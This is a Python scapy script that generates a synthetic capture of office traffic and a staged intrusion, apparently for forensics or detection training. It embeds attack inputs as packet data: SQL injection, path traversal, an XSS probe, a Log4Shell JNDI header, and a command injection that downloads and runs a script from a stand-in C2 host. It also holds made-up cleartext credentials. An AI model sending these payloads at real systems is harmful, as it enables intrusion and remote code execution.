#!/usr/bin/env python3
"""Generate a realistic synthetic capture: normal office traffic + a multi-stage intrusion.

Network: 10.0.0.0/24 office LAN, gateway/DNS 10.0.0.1
  10.0.0.15  workstation (alice)          10.0.0.20  web server (victim)
  10.0.0.31  workstation (bob)            10.0.0.66  rogue insider (ARP spoofing)
  203.0.113.66   external attacker        198.51.100.23  attacker C2 / staging server
"""
import random, struct, base64, datetime, sys
from scapy.all import (Ether, IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, DNSRR, Raw,
                       BOOTP, DHCP, NTPHeader, wrpcap, conf)

conf.verb = 0
random.seed(1337)
T0 = datetime.datetime(2026, 11, 12, 1, 0, 0, tzinfo=datetime.timezone.utc).timestamp()
pkts = []

GW_MAC = '00:1a:2b:3c:4d:01'
MACS = {
    '10.0.0.1': GW_MAC, '10.0.0.15': '3c:22:fb:a1:15:0f', '10.0.0.20': '52:54:00:9e:20:14',
    '10.0.0.31': 'f8:ff:c2:31:7a:1f', '10.0.0.40': '00:50:56:aa:00:28', '10.0.0.41': '00:50:56:aa:00:29',
    '10.0.0.66': 'de:ad:be:ef:00:66',
}
BCAST = 'ff:ff:ff:ff:ff:ff'

def mac(ip):
    return MACS.get(ip, GW_MAC)

def ttl_for(ip):
    return 64 if ip.startswith('10.') else random.choice([52, 54, 57, 118])

def add(t, p):
    p.time = T0 + t
    pkts.append(p)

def ip_pkt(src, dst, l4):
    return Ether(src=mac(src) if src.startswith('10.') else GW_MAC,
                 dst=mac(dst) if dst.startswith('10.') else GW_MAC) / IP(src=src, dst=dst, ttl=ttl_for(src)) / l4

class TcpSess:
    def __init__(self, c, sv, sp, cp=None):
        self.c, self.sv, self.sp = c, sv, sp
        self.cp = cp or random.randint(40000, 60999)
        self.cs = random.randint(1, 2**31)
        self.ss = random.randint(1, 2**31)

    def send(self, t, from_client, flags, data=b''):
        if from_client:
            l4 = TCP(sport=self.cp, dport=self.sp, flags=flags, seq=self.cs,
                     ack=self.ss if 'A' in flags else 0, window=64240)
            p = ip_pkt(self.c, self.sv, l4)
        else:
            l4 = TCP(sport=self.sp, dport=self.cp, flags=flags, seq=self.ss,
                     ack=self.cs if 'A' in flags else 0, window=65160)
            p = ip_pkt(self.sv, self.c, l4)
        if data:
            p = p / Raw(load=data)
        add(t, p)
        inc = len(data) + (1 if ('S' in flags or 'F' in flags) else 0)
        if from_client: self.cs = (self.cs + inc) % 2**32
        else: self.ss = (self.ss + inc) % 2**32
        return t

    def open(self, t, rtt=0.02):
        self.send(t, True, 'S'); self.send(t + rtt / 2, False, 'SA'); self.send(t + rtt, True, 'A')
        return t + rtt

    def close(self, t, rtt=0.02):
        self.send(t, True, 'FA'); self.send(t + rtt / 2, False, 'FA'); self.send(t + rtt, True, 'A')
        return t + rtt

    def xfer(self, t, from_client, data, mss=1448, gap=0.0004):
        for i in range(0, len(data), mss):
            self.send(t, from_client, 'PA' if i + mss >= len(data) else 'A', data[i:i + mss])
            t += gap
        return t

# ---------------- TLS helpers ----------------
def tls_client_hello(sni, alpn=(b'h2', b'http/1.1')):
    exts = b''
    name = sni.encode()
    sni_body = struct.pack('!HBH', len(name) + 3, 0, len(name)) + name
    exts += struct.pack('!HH', 0x0000, len(sni_body)) + sni_body
    alpn_list = b''.join(bytes([len(a)]) + a for a in alpn)
    alpn_body = struct.pack('!H', len(alpn_list)) + alpn_list
    exts += struct.pack('!HH', 0x0010, len(alpn_body)) + alpn_body
    sv = b'\x04\x03\x04\x03\x03'
    exts += struct.pack('!HH', 0x002b, len(sv)) + sv
    exts += struct.pack('!HH', 0x000a, 8) + b'\x00\x06\x00\x1d\x00\x17\x00\x18'
    ks = b'\x00\x1d\x00\x20' + random.randbytes(32)
    exts += struct.pack('!HHH', 0x0033, len(ks) + 2, len(ks)) + ks
    suites = b'\x13\x01\x13\x02\x13\x03\xc0\x2b\xc0\x2f\xc0\x2c\xc0\x30\xcc\xa9\xcc\xa8'
    body = (b'\x03\x03' + random.randbytes(32) + b'\x20' + random.randbytes(32) +
            struct.pack('!H', len(suites)) + suites + b'\x01\x00' + struct.pack('!H', len(exts)) + exts)
    hs = b'\x01' + len(body).to_bytes(3, 'big') + body
    return b'\x16\x03\x01' + struct.pack('!H', len(hs)) + hs

def tls_server_hello():
    exts = struct.pack('!HHH', 0x002b, 2, 0x0304) + struct.pack('!HHHH', 0x0033, 36, 0x001d, 32) + random.randbytes(32)
    body = b'\x03\x03' + random.randbytes(32) + b'\x20' + random.randbytes(32) + b'\x13\x01\x00' + struct.pack('!H', len(exts)) + exts
    hs = b'\x02' + len(body).to_bytes(3, 'big') + body
    rec = b'\x16\x03\x03' + struct.pack('!H', len(hs)) + hs
    rec += b'\x14\x03\x03\x00\x01\x01'                              # ChangeCipherSpec
    enc = tls_app(2400)[5:]
    rec += b'\x17\x03\x03' + struct.pack('!H', len(enc)) + enc        # encrypted extensions/cert
    return rec

POOL = None
def tls_app(n, blocks=None):
    global POOL
    if POOL is None: POOL = [random.randbytes(1024) for _ in range(8)]
    blocks = blocks or POOL
    out = b''
    while n > 0:
        k = min(n, 16384)
        if blocks:
            payload = b''.join(random.choice(blocks) for _ in range(k // 1024 + 1))[:k]
        else:
            payload = random.randbytes(k)
        out += b'\x17\x03\x03' + struct.pack('!H', k) + payload
        n -= k
    return out

def https(t, client, server, sni, up=600, down=20000):
    s = TcpSess(client, server, 443)
    t = s.open(t)
    s.send(t + 0.001, True, 'PA', tls_client_hello(sni))
    t = s.xfer(t + 0.03, False, tls_server_hello())
    s.send(t + 0.002, True, 'PA', b'\x14\x03\x03\x00\x01\x01' + tls_app(80))
    t = s.xfer(t + 0.01, True, tls_app(up))
    t = s.xfer(t + 0.04, False, tls_app(down))
    s.send(t + 0.002, True, 'A')
    return s.close(t + random.uniform(0.2, 1.5))

# ---------------- DNS ----------------
def dns(t, client, name, ips, qtype='A', server='10.0.0.1', rcode=0, txt=None):
    qid = random.randint(0, 65535)
    sport = random.randint(49152, 65535)
    add(t, ip_pkt(client, server, UDP(sport=sport, dport=53) / DNS(id=qid, rd=1, qd=DNSQR(qname=name, qtype=qtype))))
    if txt is not None:
        an = DNSRR(rrname=name, type='TXT', ttl=0, rdata=txt)
    else:
        an = None
        for ip in ips:
            rr = DNSRR(rrname=name, type='A', ttl=300, rdata=ip)
            an = rr if an is None else an / rr
    resp = DNS(id=qid, qr=1, aa=0, rd=1, ra=1, rcode=rcode, qd=DNSQR(qname=name, qtype=qtype), an=an)
    add(t + random.uniform(0.004, 0.03), ip_pkt(server, client, UDP(sport=53, dport=sport) / resp))

def http(t, client, server, req, resp, port=80, sess=None, close=True):
    s = sess or TcpSess(client, server, port)
    if sess is None:
        t = s.open(t)
    t = s.xfer(t + 0.001, True, req)
    t = s.xfer(t + random.uniform(0.01, 0.06), False, resp)
    s.send(t + 0.001, True, 'A')
    if close:
        t = s.close(t + 0.01)
    return t, s

def http_resp(code, reason, body=b'', ctype='text/html', server=b'Apache/2.4.52 (Ubuntu)'):
    if isinstance(body, str): body = body.encode()
    return (b'HTTP/1.1 %d %s\r\nDate: Thu, 12 Nov 2026 01:00:00 GMT\r\nServer: %s\r\nContent-Type: %s\r\n'
            b'Content-Length: %d\r\n\r\n' % (code, reason.encode(), server, ctype.encode(), len(body))) + body

def http_req(method, path, host, ua, extra=b'', body=b''):
    if isinstance(body, str): body = body.encode()
    r = b'%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n' % (method.encode(), path.encode(), host.encode(), ua.encode())
    r += extra
    if body:
        r += b'Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n' % len(body)
    return r + b'\r\n' + body

BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

# =====================================================================
# 1. Background: normal office traffic over the whole capture (0..150s)
# =====================================================================
# DHCP DORA for alice
xid = 0x5e3a91c4
cmac = MACS['10.0.0.15']
chaddr = bytes.fromhex(cmac.replace(':', ''))
def dhcp_pkt(src, dst, smac, dmac, op, yiaddr, opts):
    return Ether(src=smac, dst=dmac) / IP(src=src, dst=dst) / UDP(sport=68 if op == 1 else 67, dport=67 if op == 1 else 68) / \
        BOOTP(op=op, xid=xid, chaddr=chaddr, yiaddr=yiaddr) / DHCP(options=opts)
add(0.10, dhcp_pkt('0.0.0.0', '255.255.255.255', cmac, BCAST, 1, '0.0.0.0', [('message-type', 'discover'), ('hostname', b'ALICE-LAPTOP'), 'end']))
add(0.12, dhcp_pkt('10.0.0.1', '10.0.0.15', GW_MAC, cmac, 2, '10.0.0.15', [('message-type', 'offer'), ('server_id', '10.0.0.1'), ('router', '10.0.0.1'), ('name_server', '10.0.0.1'), ('lease_time', 86400), 'end']))
add(0.15, dhcp_pkt('0.0.0.0', '255.255.255.255', cmac, BCAST, 1, '0.0.0.0', [('message-type', 'request'), ('requested_addr', '10.0.0.15'), ('server_id', '10.0.0.1'), ('hostname', b'ALICE-LAPTOP'), 'end']))
add(0.17, dhcp_pkt('10.0.0.1', '10.0.0.15', GW_MAC, cmac, 2, '10.0.0.15', [('message-type', 'ack'), ('server_id', '10.0.0.1'), ('router', '10.0.0.1'), ('lease_time', 86400), 'end']))

def arp_resolve(t, who, target):
    add(t, Ether(src=mac(who), dst=BCAST) / ARP(op=1, hwsrc=mac(who), psrc=who, pdst=target))
    add(t + 0.0008, Ether(src=mac(target), dst=mac(who)) / ARP(op=2, hwsrc=mac(target), psrc=target, hwdst=mac(who), pdst=who))

arp_resolve(0.25, '10.0.0.15', '10.0.0.1')
arp_resolve(0.9, '10.0.0.31', '10.0.0.20')
arp_resolve(41.0, '10.0.0.15', '10.0.0.1')
arp_resolve(98.0, '10.0.0.31', '10.0.0.1')

# NTP
for t, c in [(0.4, '10.0.0.15'), (64.0, '10.0.0.31'), (128.0, '10.0.0.15')]:
    sp = random.randint(50000, 60000)
    add(t, ip_pkt(c, '162.159.200.1', UDP(sport=sp, dport=123) / NTPHeader(mode=3, version=4, ref=0, orig=0, recv=0, sent=T0 + t + 2208988800)))
    add(t + 0.018, ip_pkt('162.159.200.1', c, UDP(sport=123, dport=sp) / NTPHeader(mode=4, version=4, stratum=3, ref=T0 + t - 30 + 2208988800, orig=T0 + t + 2208988800, recv=T0 + t + 0.009 + 2208988800, sent=T0 + t + 0.009 + 2208988800)))

# Pings
for i in range(4):
    add(3.0 + i, ip_pkt('10.0.0.15', '8.8.8.8', ICMP(type=8, id=0x1c2b, seq=i + 1) / Raw(load=bytes(range(48)))))
    add(3.0 + i + 0.011, ip_pkt('8.8.8.8', '10.0.0.15', ICMP(type=0, id=0x1c2b, seq=i + 1) / Raw(load=bytes(range(48)))))

# mDNS chatter
for t in (5.0, 47.0, 95.0, 140.0):
    add(t, Ether(src=MACS['10.0.0.31'], dst='01:00:5e:00:00:fb') / IP(src='10.0.0.31', dst='224.0.0.251', ttl=255) /
        UDP(sport=5353, dport=5353) / DNS(qr=0, qd=DNSQR(qname='_googlecast._tcp.local', qtype='PTR')))

SITES = [('github.com', '140.82.114.4'), ('www.google.com', '142.250.72.14'), ('slack.com', '34.226.36.50'),
         ('outlook.office365.com', '52.97.146.162'), ('cdn.jsdelivr.net', '151.101.1.229'),
         ('fonts.gstatic.com', '142.250.72.3'), ('update.microsoft.com', '13.107.4.50'),
         ('api.stripe.com', '54.187.174.169'), ('docs.python.org', '151.101.0.223'), ('www.wikipedia.org', '208.80.154.224')]
t = 1.0
while t < 148:
    client = random.choice(['10.0.0.15', '10.0.0.15', '10.0.0.31'])
    name, ip = random.choice(SITES)
    dns(t, client, name, [ip])
    https(t + 0.04, client, ip, name, up=random.randint(400, 3000), down=random.randint(4000, 90000))
    t += random.uniform(2.5, 7.0)

# QUIC to google
qsp = 51234
for i in range(30):
    tt = 9.0 + i * 0.05
    if i == 0:
        payload = b'\xc3\x00\x00\x00\x01\x08' + random.randbytes(8) + b'\x00' + random.randbytes(1180)
    else:
        payload = bytes([0x40 | random.randint(0, 0x3f)]) + random.randbytes(random.randint(40, 1250))
    if i % 3 == 0:
        add(tt, ip_pkt('10.0.0.15', '142.250.72.14', UDP(sport=qsp, dport=443) / Raw(load=payload)))
    else:
        add(tt, ip_pkt('142.250.72.14', '10.0.0.15', UDP(sport=443, dport=qsp) / Raw(load=payload)))

# Bob uses the intranet web app normally (with HTTP Basic auth in cleartext)
for i, path in enumerate(['/', '/dashboard', '/reports/q3', '/admin/users']):
    extra = b'Authorization: Basic ' + base64.b64encode(b'admin:S3cret!2026') + b'\r\n' if path.startswith('/admin') else b''
    http(12.0 + i * 6, '10.0.0.31', '10.0.0.20',
         http_req('GET', path, 'intranet.corp.local', BROWSER_UA, extra),
         http_resp(200, 'OK', '<html><body><h1>Corp Intranet</h1>' + 'x' * random.randint(500, 4000) + '</body></html>'))

# Bob's nightly backup job logs into FTP in cleartext and pulls a CSV export over a passive data channel
csv_rows = 'customer_id,name,email,plan,mrr\n' + ''.join('%d,Customer %d,user%d@example.com,%s,%d\n' % (i, i, i, random.choice(['basic', 'pro', 'team']), random.randint(9, 499)) for i in range(1, 181))
fs = TcpSess('10.0.0.31', '10.0.0.20', 21)
tt = fs.open(30.0)
for frm, line in [(False, b'220 (vsFTPd 3.0.5)\r\n'), (True, b'USER backup\r\n'), (False, b'331 Please specify the password.\r\n'),
                  (True, b'PASS Backup#2026\r\n'), (False, b'230 Login successful.\r\n'), (True, b'TYPE I\r\n'), (False, b'200 Switching to Binary mode.\r\n'),
                  (True, b'PASV\r\n'), (False, b'227 Entering Passive Mode (10,0,0,20,195,81).\r\n'), (True, b'RETR exports/customers_export.csv\r\n'),
                  (False, b'150 Opening BINARY mode data connection for exports/customers_export.csv (%d bytes).\r\n' % len(csv_rows))]:
    tt += 0.03
    fs.send(tt, frm, 'PA', line)
ds = TcpSess('10.0.0.31', '10.0.0.20', 195 * 256 + 81)
t2 = ds.open(tt + 0.01)
t2 = ds.xfer(t2 + 0.01, False, csv_rows.encode())
ds.send(t2 + 0.001, False, 'FA'); ds.send(t2 + 0.002, True, 'FA'); ds.send(t2 + 0.003, False, 'A')
tt = t2 + 0.02
for frm, line in [(False, b'226 Transfer complete.\r\n'), (True, b'QUIT\r\n'), (False, b'221 Goodbye.\r\n')]:
    tt += 0.03
    fs.send(tt, frm, 'PA', line)
fs.close(tt + 0.02)

# ---------- files and other artifacts in normal traffic ----------
import io, zipfile, gzip as gz
from PIL import Image, ImageDraw
def png_logo():
    im = Image.new('RGB', (240, 80), (24, 38, 64)); d = ImageDraw.Draw(im)
    d.rectangle([12, 18, 56, 62], fill=(57, 135, 229)); d.rectangle([22, 28, 46, 52], fill=(24, 38, 64))
    d.text((70, 30), 'CORP INTRANET', fill=(235, 238, 242))
    b = io.BytesIO(); im.save(b, 'PNG'); return b.getvalue()
def jpeg_photo():
    im = Image.new('RGB', (480, 320)); px = im.load()
    for y in range(320):
        for x in range(480):
            px[x, y] = (int(90 + 120 * y / 320), int(140 + 60 * y / 320), int(200 - 40 * y / 320))
    d = ImageDraw.Draw(im)
    d.polygon([(0, 230), (120, 140), (210, 210), (330, 120), (480, 220), (480, 320), (0, 320)], fill=(46, 84, 62))
    d.polygon([(0, 270), (160, 220), (300, 260), (480, 240), (480, 320), (0, 320)], fill=(32, 62, 44))
    d.ellipse([380, 40, 430, 90], fill=(255, 226, 150))
    for i in range(7):
        x = 60 + i * 52; d.ellipse([x, 232, x + 18, 250], fill=(230, 190, 160)); d.rectangle([x + 2, 250, x + 16, 284], fill=random.choice([(200, 70, 60), (60, 90, 170), (230, 200, 70), (40, 40, 40)]))
    d.text((14, 12), 'Team offsite 2026', fill=(255, 255, 255))
    b = io.BytesIO(); im.save(b, 'JPEG', quality=82); return b.getvalue()
def pdf_doc(title, lines):
    body = 'BT /F1 18 Tf 60 760 Td (%s) Tj ET\n' % title + ''.join('BT /F1 11 Tf 60 %d Td (%s) Tj ET\n' % (730 - i * 16, l) for i, l in enumerate(lines))
    objs = ['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
            '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
            '<< /Length %d >>\nstream\n%sendstream' % (len(body), body), '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>']
    out = '%PDF-1.4\n'; offs = []
    for i, o in enumerate(objs): offs.append(len(out)); out += '%d 0 obj\n%s\nendobj\n' % (i + 1, o)
    x = len(out); out += 'xref\n0 %d\n0000000000 65535 f \n' % (len(objs) + 1) + ''.join('%010d 00000 n \n' % o for o in offs)
    out += 'trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n' % (len(objs) + 1, x)
    return out.encode()
def fake_pe(note):
    # A harmless stand-in: only the MZ/PE header shape and DOS stub text, no runnable code.
    b = bytearray(6144); b[0:2] = b'MZ'; b[0x3c:0x40] = (0x80).to_bytes(4, 'little')
    stub = b'This program cannot be run in DOS mode.\r\r\n$'; b[0x4e:0x4e + len(stub)] = stub
    b[0x80:0x84] = b'PE\x00\x00'; b[0x84:0x86] = (0x14c).to_bytes(2, 'little')
    b[0x200:0x200 + len(note)] = note
    return bytes(b)
def fake_elf(note):
    b = bytearray(4096); b[0:4] = b'\x7fELF'; b[4] = 2; b[5] = 1; b[6] = 1; b[0x10] = 2; b[0x12] = 0x3e
    b[0x100:0x100 + len(note)] = note
    return bytes(b)
def zip_backup():
    b = io.BytesIO()
    with zipfile.ZipFile(b, 'w', zipfile.ZIP_DEFLATED) as z:
        for n, c in [('backup/README.txt', 'Weekly config backup\n'), ('backup/nginx.conf', 'server { listen 80; root /var/www/html; }\n' * 20),
                     ('backup/users.json', '[{"user":"admin","role":"owner"},{"user":"bob.lee","role":"editor"}]')]:
            z.writestr(zipfile.ZipInfo(n, date_time=(2026, 11, 10, 2, 0, 0)), c, compress_type=zipfile.ZIP_DEFLATED)
    return b.getvalue()

LOGO, PHOTO = png_logo(), jpeg_photo()
REPORT = pdf_doc('Q3 2026 Revenue Report', ['Revenue grew 14% quarter on quarter.', 'Churn fell to 2.1%.', 'Confidential - internal use only.'])
INVOICE = pdf_doc('Invoice 88213', ['Bill to: Northwind Traders', 'Amount due: USD 12,480.00', 'Due: 30 Nov 2026'])
http(13.0, '10.0.0.15', '10.0.0.20', http_req('GET', '/static/logo.png', 'intranet.corp.local', BROWSER_UA), http_resp(200, 'OK', LOGO, 'image/png'))
dns(15.8, '10.0.0.15', 'media.example-cdn.net', ['93.184.216.34'])
http(15.9, '10.0.0.15', '93.184.216.34', http_req('GET', '/albums/2026/team-offsite.jpg', 'media.example-cdn.net', BROWSER_UA),
     http_resp(200, 'OK', PHOTO, 'image/jpeg', b'ECS (sec/96EC)'))
http(24.5, '10.0.0.31', '10.0.0.20', http_req('GET', '/reports/q3-2026.pdf', 'intranet.corp.local', BROWSER_UA),
     http_resp(200, 'OK', REPORT, 'application/pdf'))
zb = zip_backup()
http(27.0, '10.0.0.31', '10.0.0.20', http_req('GET', '/backups/config-2026-11.zip', 'intranet.corp.local', 'curl/8.5.0'),
     http_resp(200, 'OK', zb, 'application/zip').replace(b'Content-Type: application/zip\r\n', b'Content-Type: application/zip\r\nContent-Disposition: attachment; filename="config-2026-11.zip"\r\n'))
# gzip-compressed page
page = ('<html><head><title>Dashboard</title></head><body><h1>Sales dashboard</h1>' + '<p>Region totals updated hourly.</p>' * 60 + '</body></html>').encode()
gzb = gz.compress(page, mtime=0)
resp = (b'HTTP/1.1 200 OK\r\nServer: Apache/2.4.52 (Ubuntu)\r\nContent-Type: text/html; charset=utf-8\r\nContent-Encoding: gzip\r\nContent-Length: %d\r\n\r\n' % len(gzb)) + gzb
http(36.0, '10.0.0.31', '10.0.0.20', http_req('GET', '/dashboard/sales', 'intranet.corp.local', BROWSER_UA), resp)
# form login with cleartext password
http(9.0, '10.0.0.31', '10.0.0.20', http_req('POST', '/login', 'intranet.corp.local', BROWSER_UA, body='username=bob.lee&password=Summer2026%21&remember=1'),
     http_resp(302, 'Found', '', 'text/html').replace(b'Content-Length: 0\r\n', b'Location: /dashboard\r\nSet-Cookie: session=7c1e9a52f0b34d1e; HttpOnly\r\nContent-Length: 0\r\n'))
# alice falls for a fake installer (harmless PE-shaped stand-in)
dns(46.0, '10.0.0.15', 'files-share-cdn.top', ['185.220.101.45'])
http(46.1, '10.0.0.15', '185.220.101.45', http_req('GET', '/dl/invoice_viewer_setup.exe', 'files-share-cdn.top', BROWSER_UA),
     http_resp(200, 'OK', fake_pe(b'Deepacket sample - not a real program'), 'application/x-msdownload', b'nginx').replace(b'Content-Length', b'Content-Disposition: attachment; filename="invoice_viewer_setup.exe"\r\nContent-Length'))
# email with an attachment over cleartext SMTP (AUTH PLAIN)
ms = TcpSess('10.0.0.31', '10.0.0.25', 25)
MACS['10.0.0.25'] = '00:50:56:aa:00:19'
tt = ms.open(50.0)
b64 = base64.b64encode(INVOICE).decode()
mail = ('From: Bob Lee <bob.lee@corp.example>\r\nTo: accounts@northwind.example\r\nSubject: Invoice 88213\r\nMIME-Version: 1.0\r\n'
        'Content-Type: multipart/mixed; boundary="b1"\r\n\r\n--b1\r\nContent-Type: text/plain\r\n\r\nHi, please find the invoice attached.\r\nBob\r\n'
        '--b1\r\nContent-Type: application/pdf; name="invoice_88213.pdf"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="invoice_88213.pdf"\r\n\r\n'
        + '\r\n'.join(b64[i:i + 76] for i in range(0, len(b64), 76)) + '\r\n--b1--\r\n.\r\n').encode()
for frm, line in [(False, b'220 mail.corp.example ESMTP Postfix\r\n'), (True, b'EHLO bob-pc\r\n'), (False, b'250-mail.corp.example\r\n250 AUTH PLAIN LOGIN\r\n'),
                  (True, b'AUTH PLAIN ' + base64.b64encode(b'\x00bob.lee\x00Summer2026!') + b'\r\n'), (False, b'235 2.7.0 Authentication successful\r\n'),
                  (True, b'MAIL FROM:<bob.lee@corp.example>\r\n'), (False, b'250 2.1.0 Ok\r\n'), (True, b'RCPT TO:<accounts@northwind.example>\r\n'), (False, b'250 2.1.5 Ok\r\n'),
                  (True, b'DATA\r\n'), (False, b'354 End data with <CR><LF>.<CR><LF>\r\n')]:
    tt += 0.03; ms.send(tt, frm, 'PA', line)
tt = ms.xfer(tt + 0.02, True, mail)
for frm, line in [(False, b'250 2.0.0 Ok: queued as 4F1A2\r\n'), (True, b'QUIT\r\n'), (False, b'221 2.0.0 Bye\r\n')]:
    tt += 0.03; ms.send(tt, frm, 'PA', line)
ms.close(tt + 0.02)
# SNMP with a guessable write community
from scapy.all import SNMP, SNMPget, SNMPvarbind, SNMPresponse, ASN1_OID, ASN1_STRING
add(66.0, ip_pkt('10.0.0.31', '10.0.0.1', UDP(sport=50161, dport=161) / SNMP(community='corp-private', PDU=SNMPget(id=4411, varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))]))))
add(66.01, ip_pkt('10.0.0.1', '10.0.0.31', UDP(sport=161, dport=50161) / SNMP(community='corp-private', PDU=SNMPresponse(id=4411, varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'), value=ASN1_STRING(b'RouterOS 7.14 CCR2004'))]))))

# =====================================================================
# 2. The intrusion
# =====================================================================
ATK, WEB, C2 = '203.0.113.66', '10.0.0.20', '198.51.100.23'
OPEN = {21, 22, 80, 443, 3306}

# 2a. Recon: SYN scan of the web server (T1046)
ports = sorted(set([21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 1723, 3306, 3389,
                    5432, 5900, 6379, 8000, 8080, 8443, 8888, 9200, 27017] + random.sample(range(1, 10000), 120)))
random.shuffle(ports)
tt = 20.0
for p in ports:
    sp = random.choice([45122, 45123])
    add(tt, ip_pkt(ATK, WEB, TCP(sport=sp, dport=p, flags='S', seq=random.randint(1, 2**31), window=1024, options=[('MSS', 1460)])))
    if p in OPEN:
        sa = random.randint(1, 2**31)
        add(tt + 0.012, ip_pkt(WEB, ATK, TCP(sport=p, dport=sp, flags='SA', seq=sa, ack=1, window=64240)))
        add(tt + 0.024, ip_pkt(ATK, WEB, TCP(sport=sp, dport=p, flags='R', seq=1, window=0)))
    else:
        add(tt + 0.012, ip_pkt(WEB, ATK, TCP(sport=p, dport=sp, flags='RA', seq=0, ack=1, window=0)))
    tt += random.uniform(0.008, 0.03)

# 2b. Content discovery with gobuster (T1595.003)
words = ['admin', 'backup', 'wp-admin', 'login', '.git/HEAD', '.env', 'config.php', 'phpmyadmin', 'uploads', 'api', 'test',
         'old', 'dev', 'server-status', 'cgi-bin/', 'shell.php', 'db.sql', 'robots.txt', 'portal', 'console', 'manager/html',
         'debug', 'download.php', 'products.php', 'search', 'images', 'js', 'css', 'private', 'secret', 'tmp', 'logs',
         'install', 'setup.php', 'info.php', 'xmlrpc.php', 'actuator', 'jenkins', 'grafana', 'webdav']
found = {'admin': (401, 'Unauthorized'), 'login': (200, 'OK'), 'cgi-bin/': (403, 'Forbidden'), 'robots.txt': (200, 'OK'),
         'download.php': (200, 'OK'), 'products.php': (200, 'OK'), 'images': (301, 'Moved Permanently')}
tt = 30.5
sess = None
for i, w in enumerate(words):
    if i % 8 == 0:
        if sess: sess.close(tt)
        sess = TcpSess(ATK, WEB, 80); tt = sess.open(tt + 0.01)
    code, reason = found.get(w, (404, 'Not Found'))
    tt, _ = http(tt + 0.02, ATK, WEB, http_req('GET', '/' + w, '10.0.0.20', 'gobuster/3.6'),
                 http_resp(code, reason, '<html><body>%d %s</body></html>' % (code, reason)), sess=sess, close=False)
sess.close(tt + 0.01)

# 2c. SQL injection with sqlmap (T1190)
sqli = ["/products.php?id=1", "/products.php?id=1%27", "/products.php?id=1%20AND%201%3D1",
        "/products.php?id=1%20AND%201%3D2", "/products.php?id=1%27%20OR%20%271%27%3D%271",
        "/products.php?id=1%20ORDER%20BY%2010--",
        "/products.php?id=-1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT(username%2C0x3a%2Cpassword)%20FROM%20users--%20-",
        "/products.php?id=1%20AND%20SLEEP(5)--", "/products.php?id=1%20AND%20(SELECT%201%20FROM%20information_schema.tables%20LIMIT%201)%3D1",
        "/products.php?id=-1%20UNION%20SELECT%20table_name%2CNULL%20FROM%20information_schema.tables--"]
tt = 42.0
for i, path in enumerate(sqli):
    code, reason, body = (500, 'Internal Server Error', 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version') if "%27" in path and "OR" not in path else \
        (200, 'OK', '<table><tr><td>admin:5f4dcc3b5aa765d61d8327deb882cf99</td></tr></table>' if 'UNION' in path else '<html>products</html>')
    tt, _ = http(tt, ATK, WEB, http_req('GET', path, '10.0.0.20', 'sqlmap/1.8.4#stable (https://sqlmap.org)'),
                 http_resp(code, reason, body))
    tt += 0.6 if 'SLEEP' not in path else 5.0

# 2d. Path traversal and XSS probes, Log4Shell
tt, _ = http(tt + 0.5, ATK, WEB, http_req('GET', '/download.php?file=../../../../etc/passwd', '10.0.0.20', BROWSER_UA),
             http_resp(200, 'OK', 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'text/plain'))
tt, _ = http(tt + 0.4, ATK, WEB, http_req('GET', '/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E', '10.0.0.20', BROWSER_UA),
             http_resp(200, 'OK', '<html>Results for <script>alert(document.cookie)</script></html>'))
tt, _ = http(tt + 0.4, ATK, WEB, http_req('GET', '/', '10.0.0.20', BROWSER_UA, b'X-Api-Version: ${jndi:ldap://203.0.113.66:1389/Exploit}\r\n'),
             http_resp(200, 'OK', '<html>home</html>'))

# 2e. SSH brute force with hydra (T1110.001)
tt = 56.0
for i in range(36):
    s = TcpSess(ATK, WEB, 22)
    t1 = s.open(tt)
    s.send(t1 + 0.004, False, 'PA', b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10\r\n')
    s.send(t1 + 0.006, True, 'PA', b'SSH-2.0-libssh2_1.11.0\r\n')
    t1 = s.xfer(t1 + 0.01, True, random.randbytes(random.randint(900, 1400)))
    t1 = s.xfer(t1 + 0.01, False, random.randbytes(random.randint(1000, 1500)))
    t1 = s.xfer(t1 + 0.02, True, random.randbytes(random.randint(80, 200)))
    s.send(t1 + 0.3, False, 'PA', random.randbytes(68))
    s.close(t1 + 0.32)
    tt += random.uniform(0.25, 0.45)

# 2f. ARP cache poisoning by a rogue insider (T1557.002) - claims the gateway IP
for i in range(8):
    add(60.0 + i * 2.0, Ether(src=MACS['10.0.0.66'], dst=MACS['10.0.0.15']) /
        ARP(op=2, hwsrc=MACS['10.0.0.66'], psrc='10.0.0.1', hwdst=MACS['10.0.0.15'], pdst='10.0.0.15'))

# 2g. Command injection -> download stager -> reverse shell (T1190, T1105, T1059.004)
inj = '/cgi-bin/ping.cgi?host=127.0.0.1%3Bwget%20http%3A%2F%2F198.51.100.23%2Fx.sh%20-O%20%2Ftmp%2Fx.sh%3Bsh%20%2Ftmp%2Fx.sh'
tt, _ = http(74.0, ATK, WEB, http_req('GET', inj, '10.0.0.20', BROWSER_UA),
             http_resp(200, 'OK', 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n', 'text/plain'))
